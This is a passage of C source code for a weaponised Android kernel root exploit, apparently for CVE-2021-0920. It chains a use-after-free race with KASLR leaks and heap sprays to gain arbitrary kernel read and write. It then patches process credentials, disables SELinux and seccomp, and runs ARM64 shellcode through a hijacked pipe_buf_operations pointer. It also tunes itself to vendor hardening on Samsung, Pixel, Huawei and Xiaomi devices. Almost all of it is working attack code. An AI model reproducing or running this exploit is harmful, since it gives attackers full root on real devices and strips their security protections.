            for (size_t i = 0; i < sizeof(se_cand)/sizeof(se_cand[0]); i++) {
                unsigned long v = arb_read(se_cand[i]);
                if (v == 0 || v == 1) {
                    offsets.selinux_enforcing = se_cand[i];
                    LOG_D("selinux_enforcing at 0x%lx", se_cand[i]);
                    break;
                }
            }
        }
    }
    /* Also try /proc/kallsyms for selinux_enforcing */
    if (!offsets.selinux_enforcing || !is_kernel_addr(offsets.selinux_enforcing)) {
        FILE *ks = fopen("/proc/kallsyms", "r");
        if (ks) {
            char line[256], sym[256];
            unsigned long a;
            while (fgets(line, sizeof(line), ks)) {
                if (sscanf(line, "%lx %*c %255s", &a, sym) == 2 &&
                    strcmp(sym, "selinux_enforcing") == 0) {
                    offsets.selinux_enforcing = a;
                    LOG_D("selinux_enforcing from kallsyms: 0x%lx", a);
                    break;
                }
            }
            fclose(ks);
        }
    }

    if (offsets.selinux_enforcing && is_kernel_addr(offsets.selinux_enforcing)) {
        unsigned long se_val = arb_read(offsets.selinux_enforcing);
        if (se_val == 1) {
            arb_write(offsets.selinux_enforcing, 0);
            if (arb_read(offsets.selinux_enforcing) == 0)
                LOG_I("SELinux disabled");
            else
                LOG_W("SELinux disable failed");
        } else {
            LOG_D("SELinux already disabled (val=%lu)", se_val);
        }
    }

    /* Enhanced SELinux bypass with multiple fallback strategies */
    selinux_bypass();

    /* Try to disable seccomp via /proc and prctl */
    try_disable_seccomp();

    /* Enhanced seccomp bypass via task_struct manipulation */
    seccomp_bypass(task_addr);

    /* Also try to patch our current process cred through /proc/self */
    setresuid(0, 0, 0);
    setresgid(0, 0, 0);

    if (getuid() == 0) { LOG_I("ROOT!"); return 1; }

    /* Verify what happened */
    unsigned long verify_after = arb_read(cred_ptr + offsets.cred_uid);
    LOG_I("cred+uid after: 0x%lx (uid=%lu)", verify_after, verify_after & 0xffffffff);

    if ((verify_after & 0xffffffff) == 0) {
        /* Writes took effect but set*id didn't reflect. Try harder. */
        LOG_I("UID patched (0), calling setresuid...");
        setresuid(0, 0, 0);
        if (getuid() == 0) { LOG_I("ROOT!"); return 1; }

        /* Try exec'ing a child process and checking its UID */
        LOG_I("Trying exec child to check UID propagation...");
        pid_t child = fork();
        if (child == 0) {
            /* Child: see if we got root */
            if (getuid() == 0) {
                LOG_I("Child has root!");
                _exit(0);
            }
            _exit(1);
        }
        if (child > 0) {
            int status;
            waitpid(child, &status, 0);
            if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
                LOG_I("Child confirmed root via fork!");
                /* We are root in parent too, just kernel UID not updated yet */
                setresuid(0, 0, 0);
                setresgid(0, 0, 0);
                if (getuid() == 0) { LOG_I("ROOT!"); return 1; }
            }
        }
    }

    /* PTE/PAN bypass: modify page tables for kernel userspace access */
    pte_bypass();

    /* Fallback: try overwriting entire cred struct with init_cred */
    LOG_I("Trying init_cred fallback...");
    if (!offsets.init_cred) {
        FILE *ks = fopen("/proc/kallsyms", "r");
        if (ks) {
            char line[256], sym[256];
            unsigned long a;
            while (fgets(line, sizeof(line), ks)) {
                if (sscanf(line, "%lx %*c %255s", &a, sym) == 2 &&
                    strcmp(sym, "init_cred") == 0) {
                    offsets.init_cred = a;
                    break;
                }
            }
            fclose(ks);
        }
    }
    if (offsets.init_cred && is_kernel_addr(offsets.init_cred)) {
        LOG_I("init_cred at 0x%lx, attempting struct copy...", offsets.init_cred);
        /* Read init_cred structure in 8-byte chunks and write to our cred */
        for (int i = 0; i < 256; i += 8) {
            unsigned long val = arb_read(offsets.init_cred + i);
            arb_write(cred_ptr + i, val);
        }
        usleep(10000);
        setresuid(0, 0, 0);
        setresgid(0, 0, 0);
        if (getuid() == 0) { LOG_I("ROOT via init_cred copy!"); return 1; }
    }

    /* After getting root, try to patch /proc/sysrq-trigger */
    if (getuid() == 0) {
        try_sysrq_trigger();
        return 1;
    }

    /* ========== CRED PATCHING FALLBACK CHAIN ========== */
    LOG_I("Primary cred patching failed, trying fallback chain...");

    /* Method 2: Copy init_cred over our cred (already tried above) */

    /* Method 3: Try commit_creds(prepare_kernel_cred(0)) via shellcode */
    LOG_I("Cred fallback: trying commit_creds shellcode path...");
    if (try_commit_creds_shellcode()) {
        setresuid(0, 0, 0);
        setresgid(0, 0, 0);
        if (getuid() == 0) { LOG_I("ROOT via commit_creds shellcode!"); return 1; }
    }
    LOG_D("Cred fallback: commit_creds shellcode failed");

    /* Method 4: Try writing to /dev/kmem (if accessible) */
    LOG_I("Cred fallback: trying /dev/kmem write...");
    if (try_kmem_write()) {
        setresuid(0, 0, 0);
        setresgid(0, 0, 0);
        if (getuid() == 0) { LOG_I("ROOT via /dev/kmem!"); return 1; }
    }
    LOG_D("Cred fallback: /dev/kmem failed");

    LOG_E("Still uid %d (all methods failed)", getuid());
    return 0;
}

/* ========== STRATEGY FUNCTIONS ========== */
static void generate_race_delays(int *delays, int *n_delays, int base_us, int range_us) {
    int n = 0;
    for (int i = -5; i <= 5; i++) {
        delays[n++] = base_us + i * (range_us / 20);
        if (n >= 40) break;
    }
    for (int mult = 1; mult <= 4; mult++) {
        delays[n++] = base_us + mult * (range_us / 4);
        delays[n++] = base_us - mult * (range_us / 4);
        if (n >= 40) break;
    }
    for (int i = 0; i < n; i++) {
        if (delays[i] < 10) delays[i] = 10;
        if (delays[i] > 5000) delays[i] = 5000;
    }
    *n_delays = n;
}

static void derive_strategy(void) {
    memset(&g_strat, 0, sizeof(g_strat));

    /* 1. KASLR strategy priority */
    g_strat.kaslr_count = 0;
    if (g_dev.kallsyms_accessible || access("/proc/kallsyms", R_OK) == 0)
        strncpy(g_strat.kaslr_methods[g_strat.kaslr_count++], "kallsyms", 32);
    if (g_dev.sched_debug_accessible || access("/proc/sched_debug", R_OK) == 0)
        strncpy(g_strat.kaslr_methods[g_strat.kaslr_count++], "sched_debug", 32);
    if (g_dev.dmesg_accessible || access("/dev/kmsg", R_OK) == 0)
        strncpy(g_strat.kaslr_methods[g_strat.kaslr_count++], "dmesg", 32);
    if (g_dev.notes_accessible || access("/sys/kernel/notes", R_OK) == 0)
        strncpy(g_strat.kaslr_methods[g_strat.kaslr_count++], "notes", 32);
    if (g_dev.iomem_accessible || access("/proc/iomem", R_OK) == 0)
        strncpy(g_strat.kaslr_methods[g_strat.kaslr_count++], "iomem", 32);
    if (g_dev.is_userdebug || g_dev.vmallocinfo_accessible || access("/proc/vmallocinfo", R_OK) == 0)
        strncpy(g_strat.kaslr_methods[g_strat.kaslr_count++], "vmallocinfo", 32);
    if (g_strat.kaslr_count < 5)
        strncpy(g_strat.kaslr_methods[g_strat.kaslr_count++], "bruteforce", 32);

    /* 2. arb_read strategy */
    g_strat.arb_read_count = 0;
    if (g_dev.kcore_accessible || access("/proc/kcore", R_OK) == 0)
        strncpy(g_strat.arb_read_methods[g_strat.arb_read_count++], "kcore", 32);
    if (!g_dev.is_engineering)
        strncpy(g_strat.arb_read_methods[g_strat.arb_read_count++], "uaf_pipe", 32);
    if (g_strat.arb_read_count < 3)
        strncpy(g_strat.arb_read_methods[g_strat.arb_read_count++], "uaf_pipe", 32);

    /* 3. arb_write strategy */
    g_strat.arb_write_count = 0;
    if (!g_dev.cfi_detected)
        strncpy(g_strat.arb_write_methods[g_strat.arb_write_count++], "pipe_buf_ops", 32);
    if (g_dev.cfi_detected)
        strncpy(g_strat.arb_write_methods[g_strat.arb_write_count++], "msg_msg_list_del", 32);
    if (g_strat.arb_write_count < 3)
        strncpy(g_strat.arb_write_methods[g_strat.arb_write_count++], "pipe_buffer_page", 32);

    /* 4. UAF trigger */
    strncpy(g_strat.uaf_method, "gc_race", sizeof(g_strat.uaf_method));
    if (g_dev.cpu_count > 0 && g_dev.cpu_count < 4)
        g_strat.uaf_thread_count = 2;
    else if (g_dev.uptime_hours > 168)
        g_strat.uaf_thread_count = 4;
    else
        g_strat.uaf_thread_count = 3;
    g_strat.uaf_rearm_count = 4;

    /* 5. Post-exploitation */
    if (g_dev.is_selinux_enforcing && !g_dev.cfi_detected)
        g_strat.disable_selinux_method = 2;
    else if (g_dev.is_selinux_enforcing && g_dev.cfi_detected)
        g_strat.disable_selinux_method = 1;
    else
        g_strat.disable_selinux_method = 0;
    g_strat.disable_seccomp = 1;
    g_strat.use_shellcode = g_shellcode_exec;

    /* 6. Timing calculation */
    int latency = g_dev.socketpair_latency_us > 0 ? g_dev.socketpair_latency_us : g_baseline.socketpair_us;
    if (latency < 50) latency = 50;
    g_strat.race_delay_base_us = latency * 2;
    if (g_strat.race_delay_base_us < 100) g_strat.race_delay_base_us = 100;
    g_strat.race_delay_range_us = g_strat.race_delay_base_us * 4;
    g_strat.max_attempts = g_dev.recommended_attempts > 0 ? g_dev.recommended_attempts : g_max_uaf_attempts;
    g_strat.inflight_fds = g_dev.cpu_count > 0 ? g_dev.cpu_count * 150 : 600;
    if (g_strat.inflight_fds < 300) g_strat.inflight_fds = 300;
    g_strat.slab_spray_count = g_dev.total_ram_mb > 2048 ? 4000 : 2000;
    g_strat.msg_spray_queues = g_dev.total_ram_mb > 2048 ? 300 : 150;
    g_strat.pipe_spray_count = PIPE_SPRAY_COUNT;

    /* 7. OEM-specific hardening strategy adjustments */
    if (g_dev.has_samsung_rkp) {
        g_strat.disable_selinux_method = 3;
        LOG_I("Samsung RKP detected: using shellcode-based cred patching");
    }
    if (g_dev.has_pixel_cfi_precursor) {
        LOG_I("Pixel CFI precursor detected: using data-only attack");
        strncpy(g_strat.arb_write_methods[0], "msg_msg_list_del", 32);
    }
    if (g_dev.has_huawei_hardening) {
        LOG_I("Huawei device: persistence through init script may be limited");
    }
    if (g_dev.has_xiaomi_hardening) {
        g_strat.max_attempts += 30;
    }

    if (g_dev.total_ram_mb < 2048) {
        g_strat.slab_spray_count = g_dev.total_ram_mb * 2;
        if (g_strat.slab_spray_count > 2000) g_strat.slab_spray_count = 2000;
        if (g_strat.slab_spray_count < 200) g_strat.slab_spray_count = 200;
        g_strat.msg_spray_queues = g_dev.total_ram_mb;
        if (g_strat.msg_spray_queues > 150) g_strat.msg_spray_queues = 150;
        if (g_strat.msg_spray_queues < 30) g_strat.msg_spray_queues = 30;
        LOG_I("Low memory device: spray capped to %d slabs, %d queues",
              g_strat.slab_spray_count, g_strat.msg_spray_queues);
    }
}

static void log_strategy(void) {
    LOG_I("=== EXPLOIT STRATEGY ===");
    LOG_I(" KASLR methods (%d):", g_strat.kaslr_count);
    for (int i = 0; i < g_strat.kaslr_count && i < 5; i++)
        LOG_I("   %d. %s", i + 1, g_strat.kaslr_methods[i]);
    LOG_I(" arb_read methods (%d):", g_strat.arb_read_count);
    for (int i = 0; i < g_strat.arb_read_count && i < 3; i++)
        LOG_I("   %d. %s", i + 1, g_strat.arb_read_methods[i]);
    LOG_I(" arb_write methods (%d):", g_strat.arb_write_count);
    for (int i = 0; i < g_strat.arb_write_count && i < 3; i++)
        LOG_I("   %d. %s", i + 1, g_strat.arb_write_methods[i]);
    LOG_I(" UAF trigger: %s (%d threads, %d re-arms)",
          g_strat.uaf_method, g_strat.uaf_thread_count, g_strat.uaf_rearm_count);
    LOG_I(" Post-exploit: selinux=%d seccomp=%d shellcode=%d",
          g_strat.disable_selinux_method, g_strat.disable_seccomp, g_strat.use_shellcode);
    LOG_I(" Timing: base=%dus range=%dus attempts=%d inflight=%d",
          g_strat.race_delay_base_us, g_strat.race_delay_range_us,
          g_strat.max_attempts, g_strat.inflight_fds);
    LOG_I(" Spray: slab=%d msg_queues=%d pipes=%d",
          g_strat.slab_spray_count, g_strat.msg_spray_queues, g_strat.pipe_spray_count);
    LOG_I("=== END STRATEGY ===");
}

/* ========== MAIN EXPLOIT FLOW ========== */
static volatile int g_exploit_timeout = 0;
static void alarm_handler(int sig) {
    (void)sig;
    g_exploit_timeout = 1;
    LOG_W("Exploit timeout reached!");
}

static int run_exploit(void) {
    LOG_I("=== CVE-2021-0920 EXPLOIT ===");
    struct timespec t_start, t_now;
    clock_gettime(CLOCK_MONOTONIC, &t_start);

    /* Register crash handlers for self-healing */
    register_crash_handlers();

    /* Set up recovery jump point */
    if (sigsetjmp(g_exploit_jmp, 1)) {
        LOG_W("Recovered from crash in phase %d, retrying...", g_crash_phase);
        g_uaf_triggered = 0;
        g_victim_fd = -1;
        usleep(100000);
    }
    g_in_exploit = 1;

    /* Start health monitor thread */
    pthread_t health_thread;
    g_health_ok = 1;
    g_oom_detected = 0;
    pthread_create(&health_thread, NULL, health_monitor, NULL);
    pthread_detach(health_thread);

    /* Phase i: Device Intelligence Probe */
    if (!run_device_probe()) {
        LOG_W("Device probe incomplete, continuing with defaults");
    }

    /* Apply probe recommendations to global state */
    g_race_usleep = g_probe.recommended_race_delay;
    g_race_inflight = g_probe.recommended_inflight;
    g_max_uaf_attempts = g_probe.recommended_attempts;

    /* Populate g_dev from g_probe for strategy system */
    g_dev.cpu_count = g_probe.cpu_count;
    g_dev.total_ram_mb = g_probe.total_ram_mb;
    g_dev.socketpair_latency_us = g_probe.socketpair_latency_us;
    g_dev.recommended_attempts = g_probe.recommended_attempts;
    g_dev.uptime_hours = g_probe.uptime_hours;
    g_dev.is_userdebug = (strcmp(g_probe.build_type, "userdebug") == 0);
    g_dev.is_engineering = (strcmp(g_probe.build_type, "eng") == 0);
    g_dev.is_selinux_enforcing = g_probe.selinux_enforcing;
    g_dev.cfi_detected = g_probe.cfi_enabled;
    g_dev.kallsyms_accessible = g_probe.kallsyms_accessible;
    g_dev.kcore_accessible = g_probe.kcore_accessible;
    g_dev.sched_debug_accessible = (access("/proc/sched_debug", R_OK) == 0);
    g_dev.dmesg_accessible = (g_probe.dmesg_restrict == 0);
    g_dev.notes_accessible = (access("/sys/kernel/notes", R_OK) == 0);
    g_dev.iomem_accessible = (access("/proc/iomem", R_OK) == 0);
    g_dev.vmallocinfo_accessible = (access("/proc/vmallocinfo", R_OK) == 0);
    g_dev.has_samsung_rkp = g_probe.has_samsung_rkp;
    g_dev.has_pixel_cfi_precursor = g_probe.has_pixel_cfi_precursor;
    g_dev.has_huawei_hardening = g_probe.has_huawei_hardening;
    g_dev.has_xiaomi_hardening = g_probe.has_xiaomi_hardening;
    g_dev.has_mtk_hardening = g_probe.has_mtk_hardening;
    g_dev.has_qualcomm_hardening = g_probe.has_qualcomm_hardening;
    g_dev.has_kirin_hardening = g_probe.has_kirin_hardening;
    g_dev.seccomp_mode = g_probe.seccomp_mode;
    g_dev.selinux_detailed = g_probe.selinux_detailed;
    g_dev.lockdown_mode = g_probe.lockdown_mode;
    g_dev.has_pointer_auth = g_probe.has_pointer_auth;
    g_dev.has_grsecurity = g_probe.has_grsecurity;
    g_dev.aslr_bits = g_probe.aslr_bits;
    g_dev.has_kpti = g_probe.has_kpti;
    derive_strategy();
    log_strategy();

    /* Phase 0: Baseline */
    phase_begin(0, "Baseline Measurement");
    measure_baseline();
    phase_end(0, PHASE_OK);

    /* Phase 1: Setup */
    phase_begin(1, "Setup");
    setup_userfaultfd();
    phase_end(1, PHASE_OK);

    /* Phase 2: KASLR defeat (with retry) */
    phase_begin(2, "KASLR Defeat");
    g_crash_phase = 2;
    while (phase_should_retry(2, 3)) {
        if (leak_kernel_base()) { phase_end(2, PHASE_OK); break; }
        usleep(50000);
    }
    if (g_phases[2].status != PHASE_OK) { phase_end(2, PHASE_FAILED); goto fail; }
    LOG_I("Kernel base: 0x%lx", kernel_base);

    /* Phase 2.5: Retry KASLR offsets */
    if (!offsets.commit_creds || !offsets.pipe_buf_ops) {
        phase_begin(3, "KASLR Offset Retry");
        g_crash_phase = 3;
        for (int retry = 0; retry < 3; retry++) {
            if (try_kallsyms_leak()) break;
            if (try_sched_debug()) { try_kallsyms_leak(); break; }
            if (try_dmesg_leak()) break;
            usleep(50000);
        }
        phase_end(3, offsets.commit_creds ? PHASE_OK : PHASE_SKIPPED);
    }

    /* Phase 4: Device detection + offsets */
    phase_begin(4, "Device Offsets");
    g_crash_phase = 4;
    {
        char build_fp[512] = "";
        FILE *f = popen("getprop ro.build.fingerprint 2>/dev/null", "r");
        if (f) { if (fgets(build_fp, sizeof(build_fp), f)) build_fp[strcspn(build_fp, "\n")] = 0; pclose(f); }
        match_offsets_from_db(build_fp);
    }
    if (!offsets.init_task || !offsets.pipe_buf_ops) {
        if (!g_force) { LOG_E("Missing offsets, use --force"); phase_end(4, PHASE_FAILED); goto fail; }
    }
    cred_auto_probe_funcs();
    phase_end(4, PHASE_OK);

    /* Phase 5: Setup primitive infrastructure */
    phase_begin(5, "Setup Primitives");
    g_crash_phase = 5;
    if (!setup_fake_pipe_primitive()) { LOG_E("Primitive setup failed"); phase_end(5, PHASE_FAILED); goto fail; }
    phase_end(5, PHASE_OK);

    /* Phase 6: Trigger UAF via GC race (most retries) - adapt to system state first */
    phase_begin(6, "UAF Trigger");
    g_crash_phase = 6;
    adapt_to_system_state();
    setpriority(PRIO_PROCESS, 0, -20);
    warm_up_gc();
    int uaf_ok = 0;

    /* Dynamic attempt budget based on device capabilities */
    int base_attempts = g_max_uaf_attempts;
    if (g_probe.total_ram_mb > 0 && g_probe.total_ram_mb < 2048) {
        base_attempts += 50;  /* Low RAM needs more attempts */
    }
    if (g_probe.build_type && strcmp(g_probe.build_type, "user") == 0) {
        base_attempts += 75;  /* Stock builds need more attempts */
    }
    if (g_probe.uptime_hours > 168) {
        base_attempts += 25;  /* Long uptime = more memory pressure = harder race */
    }

    /* Allow up to 3 full retry rounds with cleanup between */
    for (int round = 0; round < 3 && !uaf_ok; round++) {
        if (round > 0) {
            LOG_I("UAF: Starting round %d/3 after cleanup", round + 1);
            cleanup_all();
            usleep(200000);
            /* Re-create the victim socket */
            if (socketpair(AF_UNIX, SOCK_STREAM, 0, g_ufd) < 0) {
                LOG_E("UAF: Cannot recreate socketpair after round %d", round);
                break;
            }
        }

        /* If we found a working method earlier, try it first */
        if (g_method_succeeded && g_successful_method[0] && round == 0) {
            LOG_I("Replicating successful method: %s (delay=%d, inflight=%d)",
                  g_successful_method, g_successful_delay, g_successful_inflight);
            
            g_race_usleep = g_successful_delay;
            g_race_inflight = g_successful_inflight;
            
            if (strcmp(g_successful_method, "gc_race") == 0) {
                if (trigger_uaf_gc_race()) {
                    LOG_I("Method replication succeeded!");
                    uaf_ok = 1;
                }
            } else if (strcmp(g_successful_method, "scm_race") == 0) {
                if (trigger_uaf_via_scm_race()) {
                    LOG_I("Method replication succeeded!");
                    uaf_ok = 1;
                }
            } else if (strcmp(g_successful_method, "pipe_splice") == 0) {
                if (trigger_uaf_via_pipe_splice()) {
                    LOG_I("Method replication succeeded!");
                    uaf_ok = 1;
                }
            }
            
            if (uaf_ok) break;
        }

        int max_attempts = base_attempts + (round * 30);

        for (int attempt = 0; attempt < max_attempts; attempt++) {
            if (g_exploit_timeout || g_oom_detected) {
                cleanup_all();
                g_oom_detected = 0;
                break;
            }

            /* Adaptive delay: start at baseline, adjust dynamically */
            int base_delay = g_probe.recommended_race_delay > 0 ?
                             g_probe.recommended_race_delay : 250;

            /* Every 10 attempts, vary the delay more widely */
            int delay_mult;
            if (attempt < 10) {
                /* Fine-grained near expected sweet spot */
                int fine_mults[] = {30, 40, 50, 60, 70, 80, 90, 100, 110, 120};
                delay_mult = fine_mults[attempt];
            } else {
                /* Wide sweep to find the window */
                delay_mult = 20 + (attempt * 3) % 300;
            }

            g_race_usleep = base_delay * delay_mult / 100;
            if (g_race_usleep < 10) g_race_usleep = 10;
            if (g_race_usleep > 5000) g_race_usleep = 5000;

            /* Inflight FDs increase with attempts to widen the race window */
            g_race_inflight = g_probe.recommended_inflight + (attempt * 20);
            if (g_race_inflight > 3000) g_race_inflight = 3000;

            clock_gettime(CLOCK_MONOTONIC, &t_now);
            double elapsed = (t_now.tv_sec - t_start.tv_sec) +
                             (t_now.tv_nsec - t_start.tv_nsec) / 1e9;
            LOG_I("[%.1fs] UAF round %d/3 attempt %d/%d (delay=%dus inflight=%d)",
                  elapsed, round + 1, attempt + 1, max_attempts, g_race_usleep, g_race_inflight);

            /* Re-use socketpair if possible */
            if (g_ufd[0] < 0 || g_ufd[1] < 0) {
                if (socketpair(AF_UNIX, SOCK_STREAM, 0, g_ufd) < 0) {
                    LOG_E("socketpair failed: %s", strerror(errno));
                    continue;
                }
            }

            if (trigger_uaf_unified()) {
                uaf_ok = 1;
                /* After trigger_uaf_unified() returns 1, verify g_victim_fd is usable */
                if (uaf_ok && g_victim_fd > 0) {
                    LOG_I("Verifying UAF result...");

                    /* Test 1: Can we read from it? */
                    char test_buf[1];
                    ssize_t test_r = read(g_victim_fd, test_buf, 0);

                    if (test_r < 0 && errno != EAGAIN && errno != EWOULDBLOCK && errno != EBADF) {
                        LOG_W("UAF verification: read failed errno=%d", errno);
                    } else {
                        LOG_D("UAF verification: read returned %zd errno=%d", test_r, errno);
                    }

                    /* Test 2: Try dup to ensure it's a valid fd */
                    int dup_test = fcntl(g_victim_fd, F_DUPFD_CLOEXEC, 100);
                    if (dup_test >= 0) {
                        LOG_I("UAF verification: fd %d is valid (dup to %d succeeded)", g_victim_fd, dup_test);
                        close(dup_test);
                    } else {
                        LOG_W("UAF verification: fd %d may be stale (dup failed)", g_victim_fd);
                        /* Try to get a fresh copy */
                        int new_fd = dup(g_victim_fd);
                        if (new_fd >= 0) {
                            close(g_victim_fd);
                            g_victim_fd = new_fd;
                            LOG_I("UAF: refreshed fd to %d", g_victim_fd);
                        }
                    }

                    /* Test 3: If g_victim_fd is not valid, try to get it from the UAF trigger's return value */
                    if (g_victim_fd <= 0) {
                        LOG_E("UAF verification: no valid victim fd, forcing retry");
                        uaf_ok = 0;
                    }
                }

                /* If verification failed, don't proceed to leak phase - retry UAF */
                if (!uaf_ok || g_victim_fd <= 0) {
                    LOG_W("UAF verification failed, forcing another attempt");
                    close(g_victim_fd);
                    g_victim_fd = -1;
                    /* Continue the retry loop instead of proceeding */
                }

                if (uaf_ok) break;
            }
            usleep(10000);
            g_ufd[0] = -1; g_ufd[1] = -1;

            /* After 20 attempts, check hit rate and adjust */
            if (attempt > 0 && attempt % 20 == 0) {
                int total = g_race_hits + g_race_misses;
                if (total > 0) {
                    float hit_rate = (float)g_race_hits / total;
                    LOG_D("UAF hit rate: %.1f%% (%d/%d)", hit_rate * 100, g_race_hits, total);
                    if (hit_rate < 0.01 && base_delay < 1000) {
                        base_delay *= 2;  /* No hits, increase delay window */
                        LOG_D("UAF: Increasing base delay to %d", base_delay);
                    } else if (hit_rate > 0.1) {
                        base_delay = base_delay * 3 / 4;  /* Good rate, tighten delay */
                        LOG_D("UAF: Tightening base delay to %d", base_delay);
                    }
                }
                g_race_hits = 0;
                g_race_misses = 0;
            }
        }
        if (!uaf_ok) {
            LOG_W("UAF not triggered, cleaning up and retrying round...");
            cleanup_all();
            usleep(200000);
            g_uaf_triggered = 0;
            g_victim_fd = -1;
        }
    }
    if (!uaf_ok) { LOG_E("UAF never triggered"); phase_end(6, PHASE_FAILED); goto fail; }
    phase_end(6, PHASE_OK);
    LOG_I("UAF triggered!");

    /* Phase 7: Post-UAF leak via scm_fp_list - with verification */
    phase_begin(7, "Address Leak");
    g_crash_phase = 7;

    /* Verify UAF is still valid before trying leak */
    if (g_victim_fd <= 0 || fcntl(g_victim_fd, F_GETFD) == -1) {
        LOG_W("UAF fd invalid before leak, re-triggering...");
        trigger_uaf_unified();
    }

    if (!leak_via_scm_fp_list()) {
        LOG_W("scm_fp_list leak returned nothing, retrying UAF cycle...");
        for (int retry = 0; retry < 5; retry++) {
            if (g_exploit_timeout) break;
            LOG_I("UAF retry %d/5", retry + 1);
            
            /* Use successful method if available */
            if (g_method_succeeded && g_successful_method[0]) {
                LOG_I("Using successful method %s for re-trigger", g_successful_method);
                
                if (strcmp(g_successful_method, "gc_race") == 0) {
                    g_race_usleep = g_successful_delay;
                    g_race_inflight = g_successful_inflight;
                    if (trigger_uaf_gc_race()) {
                        if (leak_via_scm_fp_list()) { LOG_I("Leak succeeded on retry"); break; }
                    }
                } else if (trigger_uaf_unified()) {
                    if (leak_via_scm_fp_list()) { LOG_I("Leak succeeded on retry"); break; }
                }
            } else if (trigger_uaf_unified()) {
                if (leak_via_scm_fp_list()) { LOG_I("Leak succeeded on retry"); break; }
            }
            usleep(50000);
        }
    }
    phase_end(7, PHASE_OK);

    /* Phase 7b: Leak pipe addresses */
    phase_begin(8, "Pipe Address Leak");
    g_crash_phase = 8;
    {
        g_pipe_file_found = 0;
        if (!pipe_leak_addresses()) {
            LOG_W("Pipe address leak failed, retrying...");
            for (int retry = 0; retry < 3; retry++) {
                if (trigger_uaf_unified()) {
                    if (pipe_leak_addresses()) break;
                }
                usleep(50000);
            }
        }
    }
    phase_end(8, PHASE_OK);

    /* Phase 9: Slab spray */
    phase_begin(9, "Slab Spray");
    g_crash_phase = 9;
    slab_spray_init();
    phase_end(9, PHASE_OK);

    /* Phase 10: Validate arb r/w */
    phase_begin(10, "Validate Primitives");
    g_crash_phase = 10;
    if (!validate_arb_read()) {
        if (!g_force) { LOG_E("Arb read failed, use --force"); phase_end(10, PHASE_FAILED); slab_spray_cleanup(); cleanup_fake_pipe(); goto fail; }
    }
    phase_end(10, PHASE_OK);

    /* Phase 11: Patch credentials */
    phase_begin(11, "Escalation");
    g_crash_phase = 11;
    if (!patch_creds()) {
        LOG_E("Escalation failed");
        phase_end(11, PHASE_FAILED);
        slab_spray_cleanup();
        cleanup_fake_pipe();
        goto fail;
    }
    phase_end(11, PHASE_OK);

    /* Phase 12: Verify root */
    phase_begin(12, "Root Verification");
    if (!verify_root()) {
        LOG_E("Root verification failed");
        phase_end(12, PHASE_FAILED);
        goto fail;
    }
    phase_end(12, PHASE_OK);

    /* Post-root cleanup */
    slab_spray_cleanup();
    cleanup_fake_pipe();
    clock_gettime(CLOCK_MONOTONIC, &t_now);
    double elapsed = (t_now.tv_sec - t_start.tv_sec) +
                     (t_now.tv_nsec - t_start.tv_nsec) / 1e9;
    g_in_exploit = 0;
    g_health_ok = 0;
    LOG_I("=== SUCCESS (%.1fs) ===", elapsed);
    return 1;

fail:
    g_in_exploit = 0;
    g_health_ok = 0;
    LOG_I("Exploit failed. Phase summary:");
    for (int i = 0; i < g_phase_count; i++) {
        LOG_I("  Phase %d (%s): %s", i, g_phases[i].phase_name,
              g_phases[i].status == PHASE_OK ? "OK" :
              g_phases[i].status == PHASE_SKIPPED ? "SKIPPED" : "FAILED");
    }
    return 0;
}

/* ================================================================
 * ULTIMATE POST-EXPLOITATION CAPABILITIES
 * ================================================================
 * All functions below run AFTER root has been obtained.
 * ================================================================ */

/*
 * ARM64 shellcode for credential elevation (template).
 * Instructions:
 *   mrs x0, tpidr_el1
 *   ldr x1, [pc, #12]
 *   str x1, [x0, #X]    ; X = cred offset (patched at runtime)
 *   ret
 *   .quad init_cred      ; 8 bytes, patched at runtime
 */
#define SHELLCODE_NWORDS 6
static uint32_t g_shellcode[6] = {
    0xD53BD000,  /* mrs x0, tpidr_el1 */
    0x58000061,  /* ldr x1, [pc, #12]  */
    0xF9000001,  /* str x1, [x0, #X]   — patched */
    0xD65F03C0,  /* ret                */
    0x00000000,  /* init_cred low 32   */
    0x00000000   /* init_cred high 32  */
};

static void *g_shellcode_page = NULL;

/* Patch shellcode template with runtime values */
static int prepare_shellcode(unsigned long init_cred_addr, unsigned long cred_offset)
{
    if (cred_offset % 8) {
        LOG_E("Cred offset 0x%lx not 8-byte aligned", cred_offset);
        return 0;
    }
    /* patch STR instruction: 0xF9000001 | ((cred_offset/8) << 10) */
    g_shellcode[2] = 0xF9000001 | ((unsigned int)(cred_offset / 8) << 10);
    g_shellcode[4] = (uint32_t)(init_cred_addr & 0xFFFFFFFF);
    g_shellcode[5] = (uint32_t)((init_cred_addr >> 32) & 0xFFFFFFFF);

    g_shellcode_page = mmap(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC,
                            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (g_shellcode_page == MAP_FAILED) {
        LOG_E("mmap exec failed: %s", strerror(errno));
        g_shellcode_page = NULL;
        return 0;
    }
    memcpy(g_shellcode_page, g_shellcode, sizeof(g_shellcode));
    __builtin___clear_cache(g_shellcode_page, (char *)g_shellcode_page + sizeof(g_shellcode));
    LOG_I("Shellcode at %p (init_cred=0x%lx, cred_off=0x%lx)",
          g_shellcode_page, init_cred_addr, cred_offset);
    return 1;
}

/* 1. KERNEL SHELLCODE EXECUTION
 *   Overwrite a pipe_buf_operations function pointer (release) to point to our
 *   shellcode, then close the pipe to trigger ->release(). */
static void kernel_shellcode_exec(void)
{
    if (!offsets.pipe_buf_ops || !is_kernel_addr(offsets.pipe_buf_ops)) {
        LOG_W("shellcode_exec: no pipe_buf_ops known, skipping");
        return;
    }
    if (!offsets.init_cred || !is_kernel_addr(offsets.init_cred)) {
        LOG_W("shellcode_exec: no init_cred known, skipping");
        return;
    }

    /* Prepare shellcode */
    if (!prepare_shellcode(offsets.init_cred, offsets.task_struct_cred)) {
        LOG_W("shellcode_exec: prepare failed");
        return;
    }

    /* Read the real ops table, we'll overwrite its 'release' entry */
    unsigned long ops_table = arb_read(offsets.pipe_buf_ops);
    if (!is_kernel_addr(ops_table)) {
        LOG_W("shellcode_exec: bad ops_table 0x%lx", ops_table);
        goto cleanup;
    }
    LOG_I("shellcode_exec: ops_table at 0x%lx", ops_table);

    /* Overwrite release (offset 8 in pipe_buf_operations: confirm=0, release=8) */
    unsigned long sc_addr = (unsigned long)g_shellcode_page;
    if (!arb_write(ops_table + 8, sc_addr)) {
        LOG_W("shellcode_exec: arb_write of function pointer failed");
        goto cleanup;
    }
    LOG_I("shellcode_exec: overwrote ops->release -> 0x%lx", sc_addr);

    /* Create a pipe and close it; pipe_release will call our shellcode */
    int p[2];
    if (pipe(p) < 0) {
